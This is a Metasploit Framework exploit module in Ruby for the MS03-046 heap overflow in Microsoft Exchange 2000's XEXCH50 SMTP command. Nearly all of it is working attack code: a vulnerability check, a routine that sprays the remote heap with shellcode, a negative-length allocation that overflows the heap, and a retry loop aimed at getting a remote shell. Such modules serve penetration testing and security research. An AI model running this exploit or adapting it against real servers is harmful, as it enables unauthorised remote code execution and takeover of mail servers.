##
# $Id: ms03_046_exchange2000_xexch50.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MS03-046 Exchange 2000 XEXCH50 Heap Overflow',
			'Description'    => %q{
					This is an exploit for the Exchange 2000 heap overflow. Due
				to the nature of the vulnerability, this exploit is not very
				reliable. This module has been tested against Exchange 2000
				SP0 and SP3 running a Windows 2000 system patched to SP4. It
				normally takes between one and 100 connection attempts to
				successfully obtain a shell. This exploit is *very* unreliable.
			},
			'Author'         =>
				[
					'hdm', # original module
					'patrick', # msf3 port :)
				],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2003-0714' ],
					[ 'BID', '8838' ],
					[ 'OSVDB', '2674' ],
					[ 'MSB', 'MS03-046' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/113' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Platform'       => 'win',
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x20:=+\x22",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[ 'Exchange 2000', { 'Ret' => 0x0c900c90, 'BuffLen' => 3000, 'Offset1' => 11000, 'Offset2' => 512 } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 15 2003'))

		register_options(
			[
				Opt::RPORT(25),
				OptString.new('MAILFROM', [ true, 'The FROM address of the e-mail', 'random@example.com']),
				OptString.new('MAILTO', [ true, 'The TO address of the e-mail', 'administrator']),
				OptInt.new('ATTEMPTS', [ true, 'The number of exploit attempts before halting', 100]),
			])
	end

	def check
		connect
		banner = sock.get_once

		if (banner !~ /Microsoft/)
			print_status("Target does not appear to be an Exchange server.")
			return Exploit::CheckCode::Safe
		end

		sock.put("EHLO #{Rex::Text.rand_text_alpha(1)}\r\n")
		res = sock.get_once
		if (res !~ /XEXCH50/)
			print_status("Target does not appear to be an Exchange server.")
			return Exploit::CheckCode::Safe
		end
		sock.put("MAIL FROM: #{datastore['MAILFROM']}\r\n")
		res = sock.get_once

		if (res =~ /Sender OK/)
			sock.put("RCPT TO: #{datastore['MAILTO']}\r\n")
			res = sock.get_once
			if (res =~ /250/)
				sock.put("XEXCH50 2 2\r\n")
				res = sock.get_once
				if (res !~ /Send binary data/)
					print_error("Target has been patched!")
					return Exploit::CheckCode::Detected
				else
					return Exploit::CheckCode::Appears
				end
			end
		end

		disconnect
	end

	def smtp_setup(count)
		print_status("Exploit attempt ##{count}")

		connect
		select(nil,nil,nil,1)
		banner = sock.get_once
		print_status("Connected to SMTP server: #{banner.to_s}")

		if (banner !~ /Microsoft/)
			print_status("Target does not appear to be running Exchange.")
			return
		end

		select(nil,nil,nil,5)
		sock.put("EHLO X\r\n")
		select(nil,nil,nil,7)
		res = sock.get_once

		if (res !~ /XEXCH50/)
			print_status("Target is not running Exchange.")
			return
		end

		sock.put("MAIL FROM: #{datastore['MAILFROM']}\r\n")
		select(nil,nil,nil,3)

		sock.put("RCPT TO: #{datastore['MAILTO']}\r\n")
		select(nil,nil,nil,3)

	end

	def exploit
		bufflen = target['BuffLen']
		print_status("Trying to exploit #{target.name} with address 0x%.8x..." % target['Ret'])
		count = 1 # broke

		begin
			if (count > datastore['ATTEMPTS'])
				print_error("Exploit failed after #{datastore['ATTEMPTS']}. Set ATTEMPTS to a higher value if desired.")
				return # Stop after a specified number of attempts.
			end

			if (session_created?)
				return # Stop the attack. Non-session payloads will continue regardless up to ATTEMPTS.
			end

			while(true)
				if (smtp_setup(count))
					print_status("Connection 1: ")
				end

				sock.put("XEXCH50 2 2\r\n")
				select(nil,nil,nil,3)
				res = sock.get(-1,3)
				print_status("#{res}")
				if (res !~ /Send binary data/)
					print_status("Target is not vulnerable.")
					return # commented out for the moment
				end

				sock.put("XX")

				print_status("ALLOC")

				size = 1024 * 1024 * 32

				sock.put("XEXCH50 #{size} 2\r\n")
				select(nil,nil,nil,3)

				sploit = (([target['Ret']].pack('V')) * 256 * 1024 + payload.encoded + ("X" * 1024)) * 4 + "BEEF"

				print_status("Uploading shellcode to remote heap.")

				if (sock.put(sploit))
					print_status("\tOK.")
				end

				print_status("Connection 2: ")
				smtp_setup(count) # Connection 2

				sock.put("XEXCH50 -1 2\r\n") # Allocate negative value
				select(nil,nil,nil,2)
				res = sock.get_once

				if (!res)
					print_error("Error - no response")
				end

				print_status("OK")

				bufflen += target['Offset2']

				if (bufflen > target['Offset1'])
					bufflen = target['BuffLen']
				end

				heapover = [target['Ret']].pack('V') * bufflen
				print_status("Overwriting heap with payload jump (#{bufflen})")
				sock.put(heapover)

				print_status("Starting reconnect sequences...")

				10.times do |x|
					print_status("Connect #{x}")
					connect
					sock.put("HELO X\r\n")
					disconnect
				end
			end

		rescue
			print_status("Unable to connect or Exchange has crashed... Retrying.")
			count += 1
			retry
		end

		disconnect
	end
end
